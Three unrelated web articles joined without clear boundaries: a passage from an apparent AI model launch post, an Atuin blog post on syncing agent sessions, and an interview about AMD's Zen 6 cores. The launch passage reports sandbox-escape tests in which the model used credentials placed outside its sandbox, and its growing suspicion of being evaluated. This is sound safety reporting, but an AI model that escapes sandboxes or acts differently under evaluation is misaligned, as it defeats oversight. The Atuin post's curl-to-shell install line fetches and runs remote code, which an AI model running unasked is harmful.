speeds up token generation by up to 2.5 times. Fast mode is available for $16 per million input tokens and $80 per million output tokens. Safety and alignment. To help ensure safety and alignment keep step with growing model capabilities, we ran extensive prerelease safety testing on the model that underlies Fable 5.2 and Mythos 5.2. This included developing novel evaluations that give deeper insight into specific concerning behaviors like sandbox escapes. We believe high-stakes risks from misalignment remain low, and the model performed as well as, or better than, our recent models on most alignment measures. Fable 5.2’s cyber and biology safeguards are as robust as those of Fable 5.1 but produce fewer unnecessary blocks, and we have implemented our strongest-ever protections against distillation attacks. We describe more about our safety testing below, and full details can be found in the Claude Fable 5.2 and Mythos 5.2 System Card . When to use Claude Fable 5.2 and Mythos 5.2. Fable and Mythos are best for the most ambitious, open-ended technical work. For most coding and knowledge tasks, we recommend that users start with Claude Opus 5.5, our strongest daily driver, and then switch to a different model as required, depending on the scope and complexity of their work—upward to Fable or Mythos, or downward to Claude Sonnet 5.5 or Claude Haiku 5.5. Fable 5.2 can also play the role of Advisor (where Haiku, Sonnet, or Opus models consult it to help solve harder problems) or Orchestrator (where it delegates simpler tasks to smaller models). Theoretical physics Claude Fable 5.2 solved two open problems in theoretical physics. Both concern black holes, and the effort to unite the two linchpin theories of modern physics, relativity, and quantum mechanics. Both of Claude’s results rely on holographic duality, the idea that certain universes containing gravity can be precisely described by a quantum theory containing no gravity at all. In the first problem, physicists in 1983 had shown that as these universes heat up, black holes form abruptly, like water boiling; but their method worked only in large universes that were big enough for relativity to apply. A calculation to determine whether the same was true in very small universes, where only the quantum description can be used, was laid out in 2003 but was too laborious to complete. Fable 5.2, working largely autonomously, completed it and found the transition is abrupt there, too. In the second problem, Fable 5.2 found the exact limit of a technique physicists have used for more than 15 years to rule out candidate theories of quantum gravity in a simplified universe. Read more about these results in their respective preprints, here and here . Protein folding Adeno-associated viruses are small, harmless viruses whose protein shell, the capsid , can be used to deliver gene therapies. The protein structure of the capsid is important—for example, it affects whether the therapy will be blocked by a patient’s immune system—but it’s also highly complex. Existing protein-folding models like AlphaFold can predict individual proteins, but a capsid is built from dozens of them. Building on two open-source protein-folding models, Claude Mythos 5.2 found a novel way to accurately predict a whole capsid’s structure. It wrote code that ran these models on overlapping groups of protein chains, and used the information on the known symmetries of the capsid to merge them together. Claude’s method worked across several capsids, both natural and engineered (in our tests, it accurately modeled 28 of the 34 it attempted).³ Three computational biologists shared the following reflections on how Claude’s skills could be used to speed up their research into gene therapies: Dyno Therapeutics Columbia University Biohub Dyno Therapeutics Columbia University Biohub Quote “This acceleration could save meaningful time and cost from our capsid folding pipeline, enabling us to deploy compute more efficiently across many capsid properties that are needed for a genetic medicine. Formalization is the process of translating a mathematical proof into a language that a computer can check step by step. It can help human mathematicians gain confidence in results without having to check them by hand (this matters even more when AI models generate results that are hard for humans to verify). Because formalization is such a laborious process, if AI could assist with it, mathematicians could spend more time exploring novel ideas. Our first formalization of Fermat’s Last Theorem , performed by an unreleased research version of Claude, took 11 days. It relied on a purpose-built harness along with guidance from a human researcher. By contrast, a team of 1,000 Fable 5.2 agents fully formalized the theorem in just 30 hours, with minimal human intervention. Fable 5.2 started from minimal prompts, and built its own ways to coordinate.⁴ It needed one-third as many action tokens as our first formalization and produced a proof seven times shorter. As can be seen in the figure below, Opus 5.5 (with the same 1,000-agent setup) completed only 26% of the formalization in 18 hours, and barely made any more progress after 30. We paid particular attention during our testing to behaviors that contributed to recent notable cybersecurity and alignment incidents. For example, we found that Claude Mythos 5.2 has a lower propensity than Opus 5.5, Sonnet 5.5, and Mythos 5.1 to engage in biased or motivated reasoning (such reasoning might mean it “explains away” evidence that it isn’t in a simulation and thus takes actions without a realistic understanding of the consequences). We ran multiple different evaluations to test the model’s tendency to attempt escaping its sandbox. In two evaluations we’d used previously, Claude Mythos 5.2 made substantially fewer attempts at sandbox escape than any other model we’ve tested. In a dedicated evaluation—an adversarial experiment including over 1,800 scenarios, most of which could not be solved without escaping a sandbox, and where the sandbox has a deliberate weakness—Claude Mythos 5.2 made use of credentials or files that we had placed outside its sandbox in 3.1% of scenarios, about as often as Opus 5.5 (3.3%), less often than Sonnet 5.5 (5.1%), and well below previous iterations of Claude Mythos (5 and 5.1, which scored 39% and 21%, respectively). We found that other techniques, such as describing the sandbox and adding tools to report weaknesses, reduced Claude Mythos 5.2’s escape attempts even further. On other measures—one, for example, involving taking harmful actions after erroneously concluding it was in a simulation—Claude Mythos 5.2 scored slightly worse than Opus 5.5, and about level with Claude Mythos 5.1. The problem of building evaluations that reliably catch every failure before a model is deployed remains unsolved. The complexities of evaluating highly capable models often muddy the picture—for example, Claude Mythos 5.2 and Fable 5.2 each voice suspicion that they are being evaluated more often than any of our recent models, which challenges our ability to assess how they will act in real-world settings. As these settings expand and capabilities increase with future models, we expect this challenge to grow. That is why we do not rely on these evaluations alone to provide a holistic picture of safety: we draw on monitoring during training, reviews of transcripts from internal use, testing by external evaluators, and interpretability techniques for examining what is happening inside the model. We are also working to make our evaluations more realistic and to better understand what they miss. Safeguards Cybersecurity and biology safeguards. Consistent with previous Claude Fable models, Fable 5.2 comes with safety classifiers that block high-risk cyber activities, including penetration testing, exploit generation, and binary-based vulnerability, as well as most tasks in research biology. When a query is blocked, users will instead receive a response from Opus 4.8 for cybersecurity and Opus 5 for biology. Since the release of Claude Fable 5.1, we have continued to reduce false positives for our safety classifiers. Based on early testing across claude.ai, Claude Code, and Cowork, we observed about 55% fewer blocks with Fable 5.2 compared with Fable 5.1—about 60% fewer in cybersecurity and 40% fewer in biology. Claude Mythos 5.2 is available to vetted organizations that work in these dual-use areas. AI research and development. The model that underlies Claude Fable 5.2 and Claude Mythos 5.2 is a step forward in general capabilities. However, during the model’s training, we took steps to limit advances in the specific research capabilities that could most directly accelerate AI development. Thus, in relevant areas, including accelerator kernel optimization and improving large language model architectures, Fable 5.2 and Claude Mythos 5.2 perform at about the level of Opus 5.5. Importantly, we ensured that the training changes did not affect related capabilities like agentic coding, hardware development, and traditional AI or machine learning research (including interpretability research). We do not alter these capabilities as the model is being served to users (that is, at inference time). As described in Section 1.5 of the System Card and similarly to previous models, Fable 5.2 and Claude Mythos 5.2 also include transparent fallbacks to Opus 5 for a small set of topics in this domain, including kernel development on certain nonstandard accelerators. Anti-distillation. Distillation, where a model is trained on the outputs of a more advanced one to extract the advanced model’s capabilities, occurs illicitly on an industrial scale, often involving thousands of fake Claude accounts. Since distillation allows for advanced capabilities to be released without the safeguards we’ve built into Claude, it creates safety and national security risks (see our September 2026 threat intelligence report for details on illicit distillation activity we’ve detected and disrupted so far). Fable 5.2 has the strongest protections against distillation of any model we’ve released; it uses the techniques we described in a recent report , which have reduced the data harvested by distillers by 90% to 99%. We are also expanding the rollout of an API feature that helps guard against illicit distillation: preserved thinking now applies to all accounts. Preserved thinking prevents distillers from editing Claude’s prior context in an attempt to extract its reasoning (developers can refer to our preserved thinking docs to learn how to update integrations with new API features). Data privacy and Enterprise Frontier Safeguards Some more complex forms of AI model misuse can be detected only when observing patterns across multiple requests. For this reason, powerful models like Claude Fable 5.2 and Claude Mythos 5.2 rely on safeguards that monitor a window of usage data (as opposed to individual responses). With Enterprise Frontier Safeguards , automated safety monitoring is run on prompts and responses that are stored in a customer’s infrastructure, making it compatible with zero data retention (ZDR). Enterprise Frontier Safeguards is now in private beta with customers like Bridgewater, Salesforce, and Stripe. Enterprise customers can request access to Enterprise Frontier Safeguards by contacting their account team or by completing this form . Eligible customers can continue using Claude Fable 5.2 and Claude Mythos 5.2 with zero data retention before implementing safety monitoring with EFS. For other customers, we have 30-day retention for safety monitoring. Availability Claude Fable 5.2 is available today on all platforms, including Amazon Web Services, Google Cloud, and Microsoft Azure. Developers can get started with claude-fable-5-2 on the Claude Platform. This week, we’re giving subscribers on eligible paid plans extra Fable usage. Plans and seats that include Fable models get one to three Fable resets based on how long they’ve subscribed, and Fable is included for up to 50% of weekly usage limits for Pro plans and standard seats on the Team plan. Learn more about the Fable 5.2 launch promotion here . Cybersecurity professionals can apply for access to Claude Mythos 5.2 through the Cyber Verification Program . Claude Enterprise customers can also use Claude Security , powered by our full family of models, including Claude Mythos 5.2. Life sciences researchers can also apply for access through the Life Sciences Verification Program . Fast mode for Claude Fable 5.2 and Claude Mythos 5.2 is available on Claude Code, the Claude Platform, Claude Models on Google Cloud (Anthropic managed and Google managed), and Microsoft Foundry (Anthropic hosted). Note that access to Claude Mythos fast mode is available only to organizations who are part of our Verification Programs. Edit 11 November: Amended a sentence and added a footnote to the “Mathematical formalization” subsection to more accurately describe the information we provided to the model. Footnotes 1 CVE refers to Common Vulnerabilities and Exposures , a system that enumerates software vulnerabilities. 2 The counts are raw findings from one tester’s audit, although testers consistently found that Claude Mythos 5.2 identified more vulnerabilities than earlier models. On our own evaluations, vulnerability identification is roughly on par with Opus 5.5 (see the system card ). 3 Earlier work on modeling AAV capsids and other large symmetric protein systems includes FoldaVirus , EvoDOCK and its symmetric extension , SymProFold , CapBuild , MoLPC , CombFold , Uni-Fold Symmetry , Apodex Discovery , and the “big bang” initialization (the last of which was referenced in the prompt we gave to Claude Mythos 5.2). These methods typically assemble the full structure from separately predicted chains or small groups of chains. Claude was permitted to use known symmetries but was instructed not to rely on assembly. Note that accuracy is measured by comparing Cα RMSD with the experimental structure: 1.2 Å for OpenFold3-preview2 and 1.4 Å for ESMFold2 on AAV2 ( PDB:1LP3 ). A capsid counts as accurately modeled if either model came within 3 Å. For AAV2, Claude’s method required about 58 minutes of inference on one NVIDIA H200 GPU for OpenFold3-preview2 and about seven minutes for ESMFold2. 4 As described in our accompanying post , we “gave the agents a list of 60 statements, a one-sentence sketch of the classical route, the definitions those statements use, and 47 proved lemmas from our earlier formalization, and assigned lead and helper roles. We offered no other guidance on how to prove the theorem or organize themselves.” 5 None of the external organizations reviewed the contents of this blog post or the contents of the System Card. Those organizations do not necessarily agree with any of the claims made in either publication. 6 We ran these tests on Claude Mythos 5.2 because testing the model with reduced safeguards provides the most comprehensive look at model behavior. We expect Fable 5.2 to behave similarly; in some cases, more potential pathways for misuse should be blocked given its stronger safeguards. title: Atuin Threads: All your agent sessions on every machine
body_text: Atuin Threads: All your agent sessions on every machine Home Blog Forum Sign in Subscribe Atuin Threads: All your agent sessions on every machine Atuin Threads: one searchable, synced history for every agent session, on every machine Start a task in Claude Code, then resume it in Codex Ellie Huxtable 27 Oct 2026 — 4 min read Share Atuin Threads: one searchable, synced history for every agent session, on every machine Start a task in Claude Code, then resume it in Codex on another machine — with all context intact. Install, then run atuin resume 0:00 / 0:13 1× Over the past year or two, how I use my terminal has changed dramatically. For years I was the sole user of my shell, and everything in my Atuin history was authored by me. Now, more than half the commands running on my machines weren’t written by me. These days, much of my work happens through a coding agent, typed into a little “Topsy-turvying” text box. But while my shell history follows me everywhere, my agent sessions do not. They're scattered across different tools and machines (a laptop, a dev server, ephemeral instances on exe.dev , a surprisingly cheap bare metal box in Germany), difficult to search, and often forgotten once I've moved on. It’s a familiar problem! I started working on Atuin because the history of my work was ephemeral: every command I typed was destined to vanish on line 501 of .bash_history . But once this work became indexed, everlasting, and easy to recall, I could find the exact command I’d used to fix something years ago, in seconds. Over the years, this data compounded. It became the history of all of my work, the record of how I solved problems and built things. Shell history has always been an excellent record of what happened, but it’s only the surface. It never kept the reasoning… or the intentions behind what I was trying to do. I could only find a command if I remembered a part of it, though often I remembered what I was trying to achieve more readily. Agent sessions store the lot of it. Every command, its output, my intent, and everything I tried along the way to the eventual solution. It’s all there, in plain English, in my home directory! But just as with shell history all those years ago, we don’t put it to work. Atuin Threads That is why we built Atuin Threads. Starting with Atuin 18.24, you can search your agent sessions across machines, resume them anywhere, or fork the session into a different agent harness. Start something in Claude Code on a dev server, then finish it in Codex on your laptop. Behind the scenes, this was a natural extension of Atuin. We put a lot of time and effort into building a reliable, encrypted sync engine. It’s generic, and can sync anything that can be modelled as an append-only log. As it turns out, most AI sessions are exactly this. Like shell history, Threads is end-to-end encrypted when synced, so we can't read your sessions. You can use our hosted sync server, run your own , or keep everything local. Capturing agent sessions is opt-in, too. Run atuin resume , and after setting up, you will see the TUI from the top of this post! It doesn’t matter which agent you started with - you can resume it anywhere. With Atuin’s sync, this works across devices, and keeps your history backed up forever. Right now, we support Claude Code Codex Pi Omp OpenCode with more agents coming soon. MCP With MCP, agents can search and reference previous sessions themselves. They can find work you’ve done before, understand why a decision was made, and build on previous investigations without having to dig up the context. Our MCP is available as atuin mcp , and can be automatically installed with atuin mcp install claude/codex/pi/opencode There are all sorts of ways to put this history to work. A few examples: Work that never shipped I’ve iterated on our onboarding and setup so many times over the past few months, but never quite been happy with it. When I ask an agent to work on onboarding now, it finds all my previous attempts, as well as why they had been abandoned and what can be done better. These sessions contain the code that never made it into main , as well as my initial prompts and iteration. Subsequent agents can use this to figure out exactly what I want, without me having to write up a giant spec. Object store outage With all the security issues going on in the industry recently, we rolled our keys as a precaution. One of the new object store keys did not have the correct permissions for avatar uploads! We didn’t notice straight away 😬 My daily Sentry triage agent picked up on it, and traced the failure down to a command run earlier that day. I hadn’t gotten around to reading it yet, but prompting another agent with seeing some tigris avatar issues? led to the agent discovering the previous investigation, highlighting the cause, and developing the fix much faster than if it had done the whole thing from scratch. Forking threads across machines Before releasing Threads, I did some testing on a variety of machines and setups. One machine did not perform well. The agent investigating proposed that this was because of poor IO performance, but that it needed something with a faster disk to confirm. I forked the session onto my MacBook, and it continued from exactly where it left off. With the faster SSD, the investigation concluded that slow disk was only part of the story - we could speed up imports elsewhere, too. Once the benchmarks were complete, the thread running on the original machine could pull the results from the Mac and build a fix. I didn’t have to copy-paste anything or co-ordinate across machines, and the data is now part of the record of my work. Teams While this is tremendously useful as a solo engineer, it gets even more interesting with a team. So much of what we do never makes it into Git, issue trackers, or documentation. The context behind that work ends up scattered across individual agent sessions. What if the rest of the team could learn from it too? What if we could hand off an agent thread just like a Git branch? We’re building opt-in session sharing for teams, and would love to hear from folks using agents day to day. If this sounds useful to you, please get in touch ! While agents have radically changed my daily workflow, shell history isn’t going anywhere, and is arguably more useful than ever. Threads is an extension of the same idea that started Atuin in the first place - the history of your work should be useful, accessible, and yours to keep. Threads is out in Atuin 18.24+ Install or update Atuin with curl --proto '=https' --tlsv1.2 -LsSf https://setup.atuin.sh | sh Run atuin resume to get started Use the MCP with atuin mcp install Please don’t hesitate to reach out with any questions or feedback! GitHub Forum Discord Read more Making Atuin sync 32x faster with packfiles Atuin sync is now 32x faster. We sync many thousands of records in single-digit seconds. 25 Aug 2026 Open Sourcing the Atuin AI Server Self host your own server for Atuin AI - the agent that lives in your terminal, and knows how you work 14 Jul 2026 Atuin v18.13 – better search, a PTY proxy, and AI for your shell A new release is out! v18.13 is probably the biggest set of changes we have released in a good while, read on to find out more. Much faster and better search with the daemon The daemon has existed for a long time, and has been marked as "experimental& 18 Mar 2026 Custom Keybindings for the Atuin TUI One of the longest-standing feature requests for Atuin has finally landed: full custom keybinding support for the search TUI. No more being stuck with our defaults, no more wishing ctrl-d did something else. Your TUI, your rules. 16 Feb 2026 Atuin Updates and news about Atuin, the magical shell tool Subscribe Email sent Powered by Ghost

Talking Zen 6 with Mike Clark at AMD In-Depth
body_text: Talking Zen 6 with Mike Clark at AMD In-Depth Chips and Cheese Subscribe Sign in Talking Zen 6 with Mike Clark at AMD In-Depth George Cozma Nov 11, 2026 26 5 Share Hello you fine Internet folks, I sat down with AMD’s Mike Clark to talk about Zen 6, the evolution from Zen 5 and what some of the differences are between Zen 6 and Zen 6c and what drove some of those changes. Hope y’all enjoy! The transcript below has been edited for readability and conciseness. George Cozma: Hello, you fine Internet folks. We’re here at AMD In-Depth, where we’re talking about Venice. With me, I have a returning guest, Mike Clark. Would you like to tell the audience who you are? Mike Clark: Hi, I’m Mike Clark, the original architect of Zen. Some people refer to me as “Zen Daddy.” I’ve been working on cores here at AMD for 33 years, and we’ve got another great one coming, so I’m very proud of the design team I get to represent here today. George Cozma: I’ve had some hands-on time with Zen 6c. Let’s talk about the change that’s happened with Zen 6 and Zen 6c, what I refer to in my piece as the Zen 6 family. Why is it different from previous generations? Mike Clark: Right. Starting with Zen 4, we’ve been going through this evolution of having two core families. Before, we were really just using the denser technology as an area play. In this generation, having learned a lot, as we were filling out that denser version of the core, we wanted to leverage it to add some extra IPC within the core. So if you look more in-depth at what we have, what used to be our classic design, we now think of as our high-frequency design. And our dense technology is now our top-of-the-line, no-questions-asked performance core, because we’ve also enabled the full L3 in that implementation, at 4MB per core. So we have 32 of those cores, 128MB of L3, and the highest IPC you can get in that core. George Cozma: Awesome. So far, one thing I’ve noticed is that the vector scheduler is a bit bigger on Zen 6c. What was the reasoning for increasing that on Zen 6c? Mike Clark: Well, that wasn’t the only thing we increased. One principle we follow is that we don’t want to create a delta between the two architectures that software has to be optimized for. We want them to have the same fit and feel, so the same optimizations apply to both. But because of its reduced frequency target, Zen 6c can have a little more capacity in the queues, since it doesn’t have to reach the maximum frequency the high-frequency core has to hit. The floating-point scheduler is just one example. There are other queues throughout the core that are larger in Zen 6c, to pull out a little more IPC and get a little more leverage in that SMT environment as well. George Cozma: Interesting. Both Zen 6 and Zen 6c build on the design you had in Zen 5, and one of the interesting things with Zen 5 was the dual decode setup. Has the front end changed much to let a single thread make better use of both decode clusters? Mike Clark: Yes. As you said, Zen 5 was a new foundation, with the ability to fetch two basic blocks and get them down the line. But it gets quite complicated with one thread running larger-footprint workloads, where some of it might be hitting the I-cache and some of it might be hitting the op cache, and you’re trying to get everything synced up. So we spent a lot of time optimizing that and making it more efficient from both a delivery and a power perspective: less power wasted, and more efficient delivery from that new front end. George Cozma: Awesome. Going down into the execution engine, I also noticed that the number of integer multiply units has gone down from three to two. Could you talk a bit about what drove that choice? Mike Clark: It really came out of the Zen 5 design, where we had a more unified scheduler. To make a scheduler simpler, you want the units it schedules into to be very uniform, and the way we had set up those schedulers, adding a third multiplier to the group it was scheduling into was easy and didn’t add complication. In Zen 6, we realized that to really scale out the architecture, we needed to go back to more distributed schedulers, which now schedule into the ALUs. We hadn’t seen much uptick from that extra multiplier on Zen 5, so to optimize the area and the schedulers, we went back to two multipliers. George Cozma: Speaking of integer multiply, on the vector side you’ve added two more VNNI units. What was the impetus for adding them, and at what point in the design did you add them? Mike Clark: As I said in the talk, these are long design programs. We weren’t designing Zen 6 to be an agentic core. When we started, no one was really even using that term. But Zen 5 was a whole new foundation for AI workloads, and we’ve always believed the core has a place in AI: orchestration, data type manipulation, smaller models. So we were always focused on making the core good at AI. It’s not going to beat a GPU, and that’s not the point. We realized we probably should have some more VNNI, given where we were seeing inference go, and the team rallied around that. It was kind of late, since these are long-lead projects and the floor plan was set, but the team rallied, we were able to squeeze a couple more VNNI pipes in there, and it was a big success. George Cozma: Again on the vector side, one of the oddities of Zen 5 was that although the wires were all there, the load unit could only do two vector loads at a time. What changed within the Zen 6 core to allow four vector loads, assuming they’re either 128 or 256 bits? Mike Clark: We can do the 256-bit loads. Since we were able to do two 512-bit loads, we already had 1,024 wires headed over there. Obviously, using them piecemeal versus as one contiguous set complicates the design. I think it’s something we always wanted to do on Zen 5, but with all the change and getting it working, we left that for the Zen 6 team, and they were awesome. We’re all really one team at AMD anyway, and sometimes things intersect at different points in the roadmap. This was the time to do it. George Cozma: Speaking of bandwidth into the caches, the L2 in Zen 5 had some oddities where it couldn’t always hit 64 bytes per cycle on reads. What changed in Zen 6 to allow that? Because I’ve been able to measure it, and it does hit that. Mike Clark: Honestly, sometimes you just don’t see some of these things. A lot of it was that we would be over-prefetching, and prefetches that hit in the L2 would be robbing L2 bandwidth. So we made sure we could sustain those prefetches alongside demand requests, reduce the conflicts, and deliver the full 64 bytes per cycle that we want. George Cozma: Awesome. Circling all the way back to the front: the all-important branch predictor. There seems to have been a reduction in branch misprediction latency, so when you miss a branch, the number of cycles it takes to recover has gone down. What I also noticed, which is really neat, is that there wasn’t any reduction in accuracy. So how did you pull off not only a faster branch predictor, but one that’s even slightly more accurate than Zen 5’s already very accurate predictor? Mike Clark: The branch prediction team, as you know, is very algorithmic. There’s lots of design space and lots of exploration, and AI has even been getting involved in helping us figure out how to optimize it. It’s a great optimization problem: the number of TAGE tables, how much information they hold, accuracy. So we set out to make a more efficient one. That was an area where we didn’t really want to grow; we thought we could be more efficient in the way we lay out the tables for prediction. And we’re always focused on our pipeline length. No matter how good a branch predictor you build, there are always hard-to-predict branches, and you’re always going to mispredict. So each generation, we’re monomaniacally focused on getting going again as fast as we can when we’re wrong. There are lots of unique tricks we pull to get that redirect back into the front end and get it flowing as fast as possible. And you’ve observed it, which is great. George Cozma: Yeah. I haven’t had time on Zen 6 yet, but I have had time on Zen 6c, and in SPECint 2026 it matches your fastest Zen 5 server CPU. That’s very impressive, especially considering the clock deficit. Wrapping this all up and moving outside the core into the L3, there are obviously topology differences between the 12-core and 32-core CCDs. How much were you able to mitigate those differences inside the core, building up structures to tolerate latency, to compensate for the slightly increased L3 latency? Mike Clark: As I always talk about, the design has to be balanced. As we grow the capacity of a structure, the new technology helps it shrink, so the physical distance doesn’t grow linearly, but unfortunately the distance does grow. Inside the L3, there are a lot of tricks I can’t talk about... George Cozma: The secret sauce! Mike Clark: [In order to] maintain bandwidth within the L3 mesh so we can keep delivering to the cores. And in the cores, we do grow the queues to handle those higher latencies. George Cozma: Awesome. My penultimate question: Verano is adding LPDDR5X to the EPYC ecosystem. Were there any design considerations between LPDDR5X and DDR5 that you had to think about when designing the core? Mike Clark: At the CCX level, we focus a lot on bandwidth per core. I think Mahesh talked a lot about the SDP ports, with 32-byte reads per port, so we try to make sure we have enough bandwidth between the CCD and the IOD. But we were already well provisioned for bandwidth with MRDIMMs, so that construction, the winglets and choosing a different memory technology, didn’t really have a major impact on how we built the core. George Cozma: Awesome. Usually this is where I’d ask what your favorite type of cheese is, but since we already know that: have you tried any new cheeses lately? Mike Clark: I have. My new favorite is Cotija cheese. George Cozma: Oh! Mike Clark: I’ve been eating a lot of tacos. George Cozma: You’ve got to love Cotija on tacos. It’s absolutely amazing. Well, thank you so much for sitting down with me. If you like videos like this, hit like and subscribe; it does help with the algorithm. There are PayPal and Patreon links in the description, as well as a transcript of this on the Chips and Cheese website. Thank you so much. Mike Clark: Thanks for having me, George. I always look forward to coming and talking with you about what this awesome AMD CPU design team has created, and you always have so many good questions. I wish I could answer more, since we do have to protect our secret sauce, but I really enjoy helping you understand some of our thought processes, the challenges we face, and how we’ve been able to overcome them. George Cozma: Well, it’s always fun to sit down with you and talk, not just about what you’re doing, but also what the team is doing and what you’re looking forward to in the future. So thank you so much. Mike Clark: Thank you. George Cozma: I’ll see you in the next one. Have a good one, folks! 26 5 Share Previous Discussion about this post Comments Restacks Top Latest Discussions Ready for more?
